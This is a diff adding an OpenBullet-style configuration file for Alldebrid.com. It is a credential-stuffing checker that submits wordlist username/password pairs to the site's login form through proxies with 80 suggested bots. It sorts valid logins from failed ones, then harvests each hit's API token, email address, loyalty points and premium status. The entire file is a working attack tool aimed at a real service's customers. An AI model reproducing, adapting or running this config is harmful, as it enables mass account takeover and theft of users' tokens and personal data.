@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "Alldebrid.com",
+  "SuggestedBots": 80,
+  "LastModified": "2019-08-09T18:10:44.0888873+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "FanTaZyX (loliX Encrypted)",
+  "Version": "1.2.1.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#XENORIS.FANTAZYX.LOGIN REQUEST POST "https://alldebrid.com/register/" 
+  CONTENT "returnpage=&from=&action=login&login_login=<USER>&login_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Host: alldebrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://alldebrid.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://alldebrid.com/register/" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 67" 
+
+#XENORIS.FANTAZYX.VERIFICATION_1 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password" 
+    KEY "Unknown login" 
+  KEYCHAIN Success OR 
+    KEY "Control panel" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Your account has not been activated yet" 
+
+#XENORIS.FANTAZYX.GET.TOKEN REQUEST GET "https://alldebrid.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Host: api.alldebrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Referer: https://alldebrid.com/account/" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#XENORIS.FANTAZYX.TOKEN.1 PARSE "<SOURCE>" LR "Standard token : </strong>" " (<a" -> VAR "XENORIS.FANTAZYX.TOKEN.1" 
+
+#XENORIS.FANTAZYX.POINTS_DE_FIDÉLITÉ PARSE "<SOURCE>" LR "Fidelity points : </strong>" "(" -> CAP "POINTS DE FIDÉLITÉ (zone_academie.com)" 
+
+#XENORIS.FANTAZYX.REQUEST.API.ALLDEBRID REQUEST GET "https://api.alldebrid.com/user/login?agent=example&token=<XENORIS.FANTAZYX.TOKEN.1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Host: api.alldebrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Referer: https://alldebrid.com/account/" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#XENORIS.FANTAZYX.CAPTURE.PREMIUM PARSE "<SOURCE>" JSON "isPremium" -> VAR "XENORIS.FANTAZYX.CAPTURE.PREMIUM" 
+
+#XENORIS.FANTAZYX.EMAIL PARSE "<SOURCE>" JSON "email" -> CAP "EMAIL" 
+
+#XENORIS.FANTAZYX.TRANSLATE.CAPTURE.PREMIUM FUNCTION Translate 
+  KEY "False" VALUE "Non" 
+  KEY "true" VALUE "Oui" 
+  KEY "True" VALUE "Oui" 
+  "<XENORIS.FANTAZYX.CAPTURE.PREMIUM>" -> CAP "PREMIUM" 
+
+#XENORIS.FANTAZYX.VERIFICATION_2 KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<XENORIS.FANTAZYX.CAPTURE.PREMIUM>" Contains "False" 
+
+
+
+
+
+
+
+
+
+
+
